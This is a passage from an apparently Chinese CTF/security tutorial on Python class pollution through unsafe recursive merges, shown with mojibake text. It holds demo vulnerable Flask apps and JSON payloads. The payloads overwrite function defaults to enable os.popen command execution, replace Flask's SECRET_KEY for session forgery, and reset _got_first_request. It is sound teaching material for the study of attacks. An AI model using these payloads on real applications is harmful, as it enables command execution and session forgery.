</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="n">secret_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#polluted</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æ”»å‡»é¢æ‹“å±•">æ”»å‡»é¢æ‹“å±•
</h2><h3 id="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢">å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢
</h3><p>ä¸»è¦ç”¨åˆ°äº†å‡½æ•°çš„<code>__defaults__</code>å’Œ<code>__kwdefaults__</code>è¿™ä¸¤ä¸ªå†…ç½®å±æ€§</p>
<h4 id="__defaults__"><code>__defaults__</code>
</h4><p><code>__defaults__</code>ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚+é”®å€¼å½¢å‚,å½“æˆ‘ä»¬å»å®šä¹‰ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå¯ä»¥ä¸ºå…¶ä¸­çš„å‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚è¿™äº›é»˜è®¤å€¼ä¼šè¢«å­˜å‚¨åœ¨<code>__defaults__</code>å…ƒç»„ä¸­ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">var_1</span><span class="p">,</span> <span class="n">var_2</span> <span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">var_3</span> <span class="o">=</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="vm">__defaults__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#(2, 3)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢ï¼Œä½†ç¨æœ‰é—®é¢˜çš„æ˜¯è¯¥å±æ€§å€¼è¦æ±‚ä¸ºå…ƒç»„ç±»å‹ï¼Œè€Œé€šå¸¸çš„å¦‚<code>JSON</code>ç­‰æ ¼å¼å¹¶æ²¡æœ‰å…ƒç»„è¿™ä¸€æ•°æ®ç±»å‹è®¾è®¡æ¦‚å¿µï¼Œè¿™å°±éœ€è¦ç¯å¢ƒä¸­æœ‰åˆé€‚çš„è§£æè¾“å…¥çš„æ–¹å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evilFunc</span><span class="p">(</span><span class="n">arg_1</span> <span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">shell</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">arg_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">arg_1</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;evilFunc&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__defaults__&#34;</span> <span class="p">:</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="kc">True</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">evilFunc</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#whoami</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">evilFunc</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#article-kelp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="__kwdefaults__"><code>__kwdefaults__</code>
</h4><p><code>__kwdefaults__</code>ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;evilFunc&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__kwdefaults__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;shell&#34;</span> <span class="p">:</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ç‰¹å®šå€¼æ›¿æ¢">ç‰¹å®šå€¼æ›¿æ¢
</h3><h4 id="osenvironèµ‹å€¼"><code>os.environ</code>èµ‹å€¼
</h4><p>å¯ä»¥å®ç°å¤šç§åˆ©ç”¨æ–¹å¼ï¼Œå¦‚<code>NCTF2022</code>ä¸­<code>calc</code>è€ƒç‚¹å¯¹<code>os.system</code>çš„åˆ©ç”¨ï¼Œç»“åˆ<code>LD_PRELOAD</code>ä¸æ–‡ä»¶ä¸Šä¼ <code>.so</code>å®ç°åŠ«æŒç­‰</p>
<h4 id="flaskç›¸å…³å±æ€§"><code>flask</code>ç›¸å…³å±æ€§
</h4><h5 id="secret_key"><code>SECRET_KEY</code>
</h5><p>å¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹å¯†é’¥è¿›è¡Œæ›¿æ¢ï¼Œèµ‹å€¼ä¸ºæˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä»»æ„çš„sessionä¼ªé€ ï¼Œè¿™é‡Œå› ä¸ºsecret_keyæ˜¯åœ¨å½“å‰å…¥å£æ–‡ä»¶ä¸‹é¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡<code>__init__.__globals__</code>è·å–å…¨å±€å˜é‡ï¼Œç„¶åé€šè¿‡app.config[&ldquo;SECRET_KEY&rdquo;]æ¥è¿›è¡Œæ±¡æŸ“</p>
<p>ç»™å‡ºç¤ºèŒƒç¯å¢ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;[+]Config:</span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;config&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;SECRET_KEY&#34;</span> <span class="p">:</span><span class="s2">&#34;Polluted~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="_got_first_request">_got_first_request
</h5><p>ç”¨äºåˆ¤å®šæ˜¯å¦æŸæ¬¡è¯·æ±‚ä¸ºè‡ª<code>Flask</code>å¯åŠ¨åç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œæ˜¯<code>Flask.got_first_request</code>å‡½æ•°çš„è¿”å›å€¼ï¼Œæ­¤å¤–è¿˜ä¼šå½±å“è£…é¥°å™¨<code>app.before_first_request</code>çš„è°ƒç”¨ï¼Œä¾æ®æºç å¯ä»¥çŸ¥é“<code>_got_first_request</code>å€¼ä¸ºå‡æ—¶æ‰ä¼šè°ƒç”¨</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è°ƒç”¨ç¬¬ä¸€æ¬¡è®¿é—®å‰çš„è¯·æ±‚ï¼Œè¿˜æƒ³è¦åœ¨åç»­è¯·æ±‚ä¸­è¿›è¡Œä½¿ç”¨çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†_got_first_requestä»trueæ”¹æˆfalseç„¶åå°±èƒ½å¤Ÿåœ¨åç»­è®¿é—®çš„è¿‡ç¨‹ä¸­ï¼Œä»ç„¶èƒ½å¤Ÿè°ƒç”¨è£…é¥°å™¨app.before_first_requestä¸‹é¢çš„å¯ç”¨ä¿¡æ¯ã€‚</p>
<p>ç¤ºèŒƒç¯å¢ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;Is flag here?&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.before_first_request</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;special&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">app</span><span class="o">.</span><span class="n">special</span> <span class="o">==</span> <span class="s2">&#34;U_Polluted_It&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="nb">setattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;special&#34;</span><span class="p">,</span> <span class="s2">&#34;U_Polluted_It&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
